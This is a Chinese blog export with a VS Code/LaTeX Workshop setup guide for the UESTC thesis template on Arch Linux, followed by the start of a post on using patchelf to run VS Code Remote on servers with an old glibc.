<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双向搜索</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.view.pdf.viewer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tab&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//将编译生成的文件放到build文件夹</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.latex.outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//使用latexmk解决插入文献bibtex需要多次编译的问题</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.latex.tools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LaTeXmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;latexmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;-xelatex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-synctex=1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-shell-escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-interaction=nonstopmode&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-file-line-error&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;%DOC%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-outdir=%OUTDIR%&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.latex.recipes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LaTeXmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;XeLaTeXmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//去掉右下角烦人的警告</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.message.error.show&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.message.warning.show&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.latex.clean.fileTypes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="comment">//设定清理文件的类型(ctrl+alt+c：清除辅助文件)</span></span><br><span class="line">    <span class="string">&quot;*.aux&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.bbl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.blg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.idx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.ind&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.lof&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.lot&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.out&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.toc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.acn&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.acr&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.alg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.glg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.glo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.gls&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.ist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.fls&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.log&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.fdb_latexmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.nav&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.snm&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.bcf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;*.run.xml&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;extensions.ignoreRecommendations&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;zotero.latexCommand&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cite&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;[latex]&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnPaste&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.suggestSelection&quot;</span><span class="punctuation">:</span> <span class="string">&quot;recentlyUsedByPrefix&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h2 id="电子科技大学论文模板"><a href="#电子科技大学论文模板" class="headerlink" title="电子科技大学论文模板"></a>电子科技大学论文模板</h2><p>Github上有一个不错的模板是<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoaWZ1anVuL1VFU1RDdGhlc2lz">shifujun&#x2F;UESTCthesis<i class="fa fa-external-link-alt"></i></span>，但是时老师的这个模板很久没更新了。<br>另一个是还在一直更新的模板，本硕博都有，直接clone下来改一下就好了（你电图书馆推荐的，勉强算是半官方的吧）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/x-magus/ThesisUESTC</span><br></pre></td></tr></table></figure>

<p>网上有一些教程，包括：<br>知乎上的一篇文章<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjY3MTI5ODI=">UESTC 本科Latex毕设论文模板 无痛上手指南<i class="fa fa-external-link-alt"></i></span>，这个我本科写毕设的时候就看到同学在朋友圈转过。这个教程我不是很推荐，因为：</p>
<blockquote>
<p>但是这里为了减少小伙伴们的学习成本达到“快速无痛上手”的目的（同时考虑到有些小伙伴用word写的很熟练），这里引用电子科大图书馆嵇灵老师的方法：用mathtype编辑，然后转化为latex代码。</p>
</blockquote>
<p>河畔现任站长的介绍帖子：<span class="exturl" data-url="aHR0cHM6Ly9iYnMudWVzdGMuZWR1LmNuL2ZvcnVtLnBocD9tb2Q9dmlld3RocmVhZCZ0aWQ9MTc4NjIzMSZleHRyYT0mcGFnZT0x">LaTeX 学校官方模板-2019年11月发<i class="fa fa-external-link-alt"></i></span> （需要登陆查看）<br>以及上一个帖子附件中嵇灵老师的PPT： 使用Latex模板撰写毕业论文（2019)<br>ps：个人不推荐这个PPT，里面推荐使用被思杰克马丁代理的Mathtype，推荐直接使用Office 2019的<code>Alt+=</code>手打公式（比LaTeX的公式甚至还舒服一点，也直接支持LaTeX的公式），实在想用图形界面输入公式就用AxMath吧，正版30多，还算良心不。  </p>
<p>上面那些教程的安装和使用几乎都是Windows环境，编辑器是overleaf和texstudio，而且操作偏向图形化界面点点点（Linux用户应该不会喜欢连LaTeX打公式都要点点点再粘贴上去）</p>
<p>注意要安装下面这些额外的包，不然会报<code>! LaTeX Error: File &#39;multirow.sty&#39; not found</code>等错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S texlive-latexextra texlive-science texlive-bibtexextra</span><br></pre></td></tr></table></figure>

<h3 id="Archlinux下字体问题"><a href="#Archlinux下字体问题" class="headerlink" title="Archlinux下字体问题"></a>Archlinux下字体问题</h3><p>一种选择是装win10字体，然后修改<code>thesis-uestc.cls</code>的Default字体设置。AUR有个包<code>ttf-ms-win10-auto-zh_cn</code>，但是这个包由于再分发的版权原因要下载整个win10的iso，然后解压只保留ttf字体文件。身边有win10的建议直接将ttf文件拷贝过来（只要<code>simhei.ttf</code>，<code>simsong.ttf</code>，<code>simkai.ttf</code>就可以了）。<br>或者安装方正字体（默认的），AUR有个包<code>ttf-fangzheng</code>由于版权原因，也不能直接yay安装，只提供PKGBUILD，需要到官网下载ttf然后手动<code>makepkg</code></p>
<p>另一种选择是找到模板的字体设置，直接修改<code>thesis-uestc.cls</code>文件（反正毕业论文只要求宋体和黑体，又没说什么宋体和黑体，用系统默认的黑体和宋体就行了）</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\else</span></span><br><span class="line"><span class="keyword">\iflinux</span></span><br><span class="line">  <span class="keyword">\setCJKmainfont</span>[BoldFont=FandolSong-Bold.otf,ItalicFont=FandolKai-Regular.otf]&#123;FandolSong-Regular.otf&#125;</span><br><span class="line">  <span class="keyword">\newCJKfontfamily</span>&#123;<span class="keyword">\heiti</span>&#125;&#123;FandolHei-Regular.otf&#125;</span><br><span class="line">  <span class="keyword">\newfontfamily</span>&#123;<span class="keyword">\heiti@letter</span>&#125;&#123;FandolHei-Regular.otf&#125;</span><br><span class="line">  <span class="keyword">\setallmainfonts</span>&#123;Times New Roman&#125;</span><br></pre></td></tr></table></figure>

<p>除了中文字体还需要一个Times New Roman罗马字体，这个AUR的包可以直接装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S ttf-times-new-roman</span><br></pre></td></tr></table></figure>

<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>直接运行<code>latexmk main.tex</code>就可以了。</p>
<p>在VSCode里面装了LaTeX Workshop可以点击左上角那个绿色的运行按钮。会弹出一个pdf，将pdf放到右边一栏</p>
<h3 id="关于你电的一些问题"><a href="#关于你电的一些问题" class="headerlink" title="关于你电的一些问题"></a>关于你电的一些问题</h3><p>什么？教务处非要收word怎么办？要不妥协用Word，要不用pdf转图片转Word随便交一个上去，要不就pandoc顶着格式乱掉硬转一个，反正这个就是规定留档，没人看。<br>（隔壁西电早都支持提交LaTeX论文呢，不会有的985连这都不支持吧，非要冒着被制裁的风险用微软家的Word？不会吧？）</p>
<p>老板要用Word批注功能怎么办？这个没办法，回去用Word吧。<br>推荐你畔现任站长的一篇文章：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0N1aWFDdWlTaGEvVXNlV29yZEluVGhlc2lz">适用于毕业论文的word排版技巧<i class="fa fa-external-link-alt"></i></span> 之前本科毕设论文排版就看的这个，比你电图书馆的讲座教程和PPT好多了。</p>
<p>知网查重LaTeX会查公式，查重率高怎么办？不好意思这个没办法。</p>
<h2 id="LaTeX教程和模板推荐"><a href="#LaTeX教程和模板推荐" class="headerlink" title="LaTeX教程和模板推荐"></a>LaTeX教程和模板推荐</h2><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>LaTeX本来就是用于排版的专业排版工具，能做出很多相当漂亮和复杂的效果。LaTeX能做到什么程度可以看StackExchange上的这个问题：<span class="exturl" data-url="aHR0cHM6Ly90ZXguc3RhY2tleGNoYW5nZS5jb20vcXVlc3Rpb25zLzEzMTkvc2hvd2Nhc2UtJTIwJTIwb2YtYmVhdXRpZnVsLXR5cG9ncmFwaHktZG9uZS1pbi10ZXgtZnJpZW5kcw==">Showcase of beautiful typography done in TeX &amp; friends<i class="fa fa-external-link-alt"></i></span></p>
<p>想要自己从0设计排版成这样的效果是需要肝的。而我用LaTeX是因为不想花太多精力在排版上，想把它当成Markdown一样的东西用。所以我需要模板。</p>
<p>模板可以来这里找：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGF0ZXhzdHVkaW8ubmV0Lw==">LaTeXStudio<i class="fa fa-external-link-alt"></i></span> 不过这个网站最近突然换了前端页面还多了不少广告（有种不详的预感）  </p>
<h3 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h3><p>教程这个不同人适合不同的教程，下面是我比较喜欢的一个：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxNC8wOS8wOC9sYXRleC1pbnRyb2R1Y3Rpb24v">一份其实很短的 LaTeX 入门文档<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="关闭LaTeX-Workshop右下角的烦人通知"><a href="#关闭LaTeX-Workshop右下角的烦人通知" class="headerlink" title="关闭LaTeX Workshop右下角的烦人通知"></a>关闭LaTeX Workshop右下角的烦人通知</h3><p>LaTeX WorkShop插件每次保存都会弹出通知<code>Formatting failed. Please refer to LaTeX Workshop Output for details.</code></p>
<p>关闭右下角每次都弹出的烦人提示</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;latex-workshop.message.error.show&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.message.warning.show&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h3 id="双向跳转"><a href="#双向跳转" class="headerlink" title="双向跳转"></a>双向跳转</h3><p><del>双向奔赴了属于是</del></p>
<p>目前最新的LaTeX Workshop插件是无需配置可以直接跳转的。（插件内置的PDF.js，在VSCode内预览）<br>网上很多教程已经过时了，直接看官方文档。官方文档写的很清楚：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phbWVzLVl1L0xhVGVYLVdvcmtzaG9wL3dpa2kvVmlldyNzeW5jdGV4">https://github.com/James-Yu/LaTeX-Workshop/wiki/View#synctex<i class="fa fa-external-link-alt"></i></span></p>
<p>从pdf跳转到tex文件使用<code>Ctrl+鼠标左键</code><br>从tex文件定位到pdf相应位置<code>Ctrl+Alt+J</code>  </p>
<h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><p>插入图片可以放到相应位置然后手写<code>\includegraphics&#123;example.jpg&#125;</code>。<br>如果想从剪切板自动粘贴，和Markdown一样，用paste image插件就行了。我Markdown的paste image配置和latex的不一样，所以放到workspace的json文件里</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.defaultName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;X&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.encodePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;currentFileDir&#125;/pic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.showFilePathConfirmInputBox&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.insertPattern&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\\includegraphics[scale =]&#123;$&#123;imageSyntaxPrefix&#125;$&#123;imageFilePath&#125;$&#123;imageSyntaxSuffix&#125;&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>或者我们在user的<code>settings.json</code>里加上</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;[latex]&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.insertPattern&quot;</span><span class="punctuation">:</span> .......</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>表示只对latex生效。</p>
<p>insertPattern选项请根据模板自己修改，比如你电的学位论文模板改成这样就可以了。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pasteImage.insertPattern&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\\begin&#123;figure&#125;[h]\n\t\\includegraphics[width= 6cm]&#123;$&#123;imageFileName&#125;&#125;\n\t\\caption&#123;$&#123;imageFileNameWithoutExt&#125;&#125;\n\t\\label&#123;fig:$&#123;imageFileNameWithoutExt&#125;&#125;\n\\end&#123;figure&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>另外需要注意的是paste image插件的快捷键<code>ctrl+alt+v</code>和LaTeX Workshop冲突，要在<code>Keyboard Shortcuts</code>里面换掉一个，不然快捷键粘贴图片不起作用。</p>
<h3 id="参考文献报错"><a href="#参考文献报错" class="headerlink" title="参考文献报错"></a>参考文献报错</h3><p>设置参考文献这两行要放在<code>\end&#123;document&#125;</code>前面</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\bibliography</span>&#123;export.bib&#125;</span><br><span class="line"><span class="keyword">\bibliographystyle</span>&#123;plain&#125;</span><br></pre></td></tr></table></figure>

<p>不然会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I found no \bibdata command---while reading file test.aux</span><br><span class="line">I found no \bibstyle command---while reading file test.aux</span><br></pre></td></tr></table></figure>

<h3 id="某些知网文献bibtex编译报错"><a href="#某些知网文献bibtex编译报错" class="headerlink" title="某些知网文献bibtex编译报错"></a>某些知网文献bibtex编译报错</h3><p>垃圾知网不仅弄出了天价查重、caj格式这些天怒人怨的东西，中文文献的引用格式也挺乱的，经常缺这个少那个，而且不支持bibtex。如果用zotero转出来也会因为缺少各种字段而报错。查了一下没什么太好的解决办法。<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI2Mzk4OTA5L2Fuc3dlci8zMjY0Mzc4OA==">如何使用BibTeX引用中文参考文献？ - 刘海洋的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> 刘海洋老师推荐自己写bibtex，但是我给这些东西写这些，我用LaTeX就是因为不想在word的排版上纠缠过多。  </p>
<p>百度好歹干了点人事，能导出bibtex格式。但是有很多学位论文，百度学术也没有万方也没有，就知网有。  </p>
<p>之前说过，如果单纯为了插入GB&#x2F;T格式的参考文献可以用一点脏办法: <span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDE4MDU3MDQ=">电子科技大学LaTeX模板参考文献问题解决<i class="fa fa-external-link-alt"></i></span> (不得已的办法)。比如插入知网文献的时候可以用这个。<strong>一开始觉得这是不太好的脏办法</strong>，在被知网的一些参考文献格式整麻了以后，觉得<strong>这才是最好的方法</strong>。直接粘贴纯文本，反正最后排版效果一样就行了。bibtex的理念不适合处理脏东西，脏东西要用脏办法。</p>
<p>编辑<code>thesis-uestc.bst</code>, 新建一个参看文献格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FUNCTION &#123;biaoti&#125;</span><br><span class="line">&#123;</span><br><span class="line">    bibitem.begin</span><br><span class="line">    title write$</span><br><span class="line">    newline$</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>reference.bib</code>里面粘贴复制粘贴的文本就可以了，相当于引用纯文本</p>
<h3 id="自动换行"><a href="#自动换行" class="headerlink" title="自动换行"></a>自动换行</h3><p>只对Latex开启自动换行</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;[latex]&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;editor.wordWrap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="电子科技大学论文模板识别不了linux环境"><a href="#电子科技大学论文模板识别不了linux环境" class="headerlink" title="电子科技大学论文模板识别不了linux环境"></a>电子科技大学论文模板识别不了linux环境</h4><p>编译的时候加参数<code>-shell-escape</code>。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3p1aWN5L1VFU1RDX3JlcG9ydF9sYXRleC90cmVlL21hc3Rlci9VRVNUQ19yZXBvcnQ=">https://github.com/zuicy/UESTC_report_latex/tree/master/UESTC_report<i class="fa fa-external-link-alt"></i></span> 电子科技大学实验报告的LaTeX模板，是你电信软学院的同学做的，看起来似乎全校通用（改一下学院名字就好了）。<br>LaTeXStudio上那个是比较老的模板：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGF0ZXhzdHVkaW8ubmV0L2FyY2hpdmVzLzUxNTQxLmh0bWw=">电子科大的实验报告 LaTeX 模板 - 用户投稿<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMTE4ODkyNTI=">Linux 下的 LaTex 写作工具链（1）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3h1Z2VlLmNvbS9pbWFnZXMvMy8zYS9WU2NvZGUlRTQlQkQlQkYlRTclOTQlQTglRTglQUYlQjQlRTYlOTglOEUucGRm">VScode使用说明(Zotero插件) 刘再华<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21ibG9kZS92c2NvZGUtem90ZXJv">https://github.com/mblode/vscode-zotero<i class="fa fa-external-link-alt"></i></span> vscode zotero的Markdown引用文献插件。  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAxNi8wMS8yMy91c2luZy1iaWJ0ZXgtdG8tZ2VuZXJhdGUtcmVmZXJlbmNlLw==">使用 BibTeX 生成参考文献列表<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpYm9va3Mub3JnL3dpa2kvTGFUZVg=">https://en.wikibooks.org/wiki/LaTeX<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1c2hpZG9uZy9iaWJsYXRleC16aC1jbg==">https://github.com/hushidong/biblatex-zh-cn<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1c2hpZG9uZy9iaWJsYXRleC1zb2x1dGlvbi10by1sYXRleC1iaWJsaW9ncmFwaHk=">https://github.com/hushidong/biblatex-solution-to-latex-bibliography<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAyMC8wNC8yNC91c2luZy1MYVRlWG1rLXdpdGgtTGFUZVh3b3Jrc2hvcC13aXRoLVZTQ29kZS8=">https://liam.page/2020/04/24/using-LaTeXmk-with-LaTeXworkshop-with-VSCode/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2Rkc3dodS5tZS9wb3N0cy8yMDE4LTA0L3ZzLWNvZGUtZm9yLWxhdGV4Lw==">http://ddswhu.me/posts/2018-04/vs-code-for-latex/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudHVnLm9yZy90ZXhsaXZlL2RvYy90ZXhsaXZlLXpoLWNuL3RleGxpdmUtemgtY24ucGRm">https://www.tug.org/texlive/doc/texlive-zh-cn/texlive-zh-cn.pdf<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Zotero</tag>
        <tag>LaTeX</tag>
      </tags>
  </entry>
  <entry>
    <title>使用patchelf更改可执行文件的动态库和glibc版本</title>
    <url>/patchelf/</url>
    <content><![CDATA[<p>有时有一些比较无奈的场景，比如glibc版本太低了跑不起来。又或者动态库找的路径或者版本不对。这个时候我们就可以利用patchelf修改，以免重新编译。</p>
<span id="more"></span>

<h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>patchelf是一个很好用的工具，可以用来编辑rpath，也可以用来指定glibc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S patchelf</span><br></pre></td></tr></table></figure>

<p>然后会下载到libs目录下面。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/blog master !1 ❯ patchelf --<span class="built_in">help</span>                                                                                            7s</span><br><span class="line">syntax: patchelf</span><br><span class="line">  [--set-interpreter FILENAME] 指定ld</span><br><span class="line">  [--page-size SIZE] 指定页大小</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-os-abi]              Prints <span class="string">&#x27;EI_OSABI&#x27;</span> field of ELF header</span><br><span class="line">  [--set-os-abi ABI]            Sets <span class="string">&#x27;EI_OSABI&#x27;</span> field of ELF header to ABI.</span><br><span class="line">  [--print-soname]              Prints <span class="string">&#x27;DT_SONAME&#x27;</span> entry of .dynamic section. Raises an error <span class="keyword">if</span> DT_SONAME doesn<span class="string">&#x27;t exist</span></span><br><span class="line"><span class="string">  [--set-soname SONAME]         Sets &#x27;</span>DT_SONAME<span class="string">&#x27; entry to SONAME. 设置DT_SONAME</span></span><br><span class="line"><span class="string">  [--set-rpath RPATH]   指定rpath</span></span><br><span class="line"><span class="string">  [--add-rpath RPATH]</span></span><br><span class="line"><span class="string">  [--remove-rpath]</span></span><br><span class="line"><span class="string">  [--shrink-rpath]</span></span><br><span class="line"><span class="string">  [--allowed-rpath-prefixes PREFIXES]           With &#x27;</span>--shrink-rpath<span class="string">&#x27;, reject rpath entries not starting with the allowed prefix</span></span><br><span class="line"><span class="string">  [--print-rpath]</span></span><br><span class="line"><span class="string">  [--force-rpath]</span></span><br><span class="line"><span class="string">  [--add-needed LIBRARY] </span></span><br><span class="line"><span class="string">  [--remove-needed LIBRARY]</span></span><br><span class="line"><span class="string">  [--replace-needed LIBRARY NEW_LIBRARY]</span></span><br><span class="line"><span class="string">  [--print-needed]</span></span><br><span class="line"><span class="string">  [--no-default-lib]</span></span><br><span class="line"><span class="string">  [--no-sort]           Do not sort program+section headers; useful for debugging patchelf.</span></span><br><span class="line"><span class="string">  [--clear-symbol-version SYMBOL]</span></span><br><span class="line"><span class="string">  [--add-debug-tag]</span></span><br><span class="line"><span class="string">  [--print-execstack]           Prints whether the object requests an executable stack</span></span><br><span class="line"><span class="string">  [--clear-execstack]</span></span><br><span class="line"><span class="string">  [--set-execstack]</span></span><br><span class="line"><span class="string">  [--rename-dynamic-symbols NAME_MAP_FILE]      Renames dynamic symbols. The map file should contain two symbols (old_name new_name) per line</span></span><br><span class="line"><span class="string">  [--output FILE]</span></span><br><span class="line"><span class="string">  [--debug]</span></span><br><span class="line"><span class="string">  [--version]</span></span><br><span class="line"><span class="string">  FILENAME...</span></span><br></pre></td></tr></table></figure>

<p>需要patch的glibc和动态库可以下载glibc-all-in-one，或者从aur装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line">python update-list</span><br><span class="line"><span class="built_in">cat</span> list</span><br><span class="line"><span class="comment"># 下载对应版本的链接器</span></span><br><span class="line"><span class="comment"># ubuntu18可能需要下载zstd</span></span><br><span class="line"><span class="comment"># apt install zstd</span></span><br><span class="line">./download 2.38-3ubuntu1_amd64</span><br></pre></td></tr></table></figure>

<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>例子：vscode 1.86的remote要求glibc 2.28及以上，于是在各种祖传老服务器就连不上了。<br>vscode这帮人乐死我了，他们甚至不愿意在breaking changes之前发个警告，不愧是win10更新蓝屏搞到怨声载道的巨硬。  </p>
<p>要知道一周之前就有人发issue讨论这个问题：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUvaXNzdWVzLzIwMzk2Nw==">https://github.com/microsoft/vscode/issues/203967<i class="fa fa-external-link-alt"></i></span> 结果官方给出的方案就是手动下载一个portable版本，用老版本</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUvaXNzdWVzLzIwMzk2Nw==">https://github.com/microsoft/vscode/issues/203967<i class="fa fa-external-link-alt"></i></span> 于是更新之后果不其然被骂惨了</p>
<p>当然你也可以给祖传服务器升级glibc，不过glibc这么重要的依赖，祖宗之法不可变。当然是想办法改改vscode了，这个时候再次轮到patchelf</p>
<p>首先移除<code>.vscode-server</code>，然后用vscode remote重新连接一遍。</p>
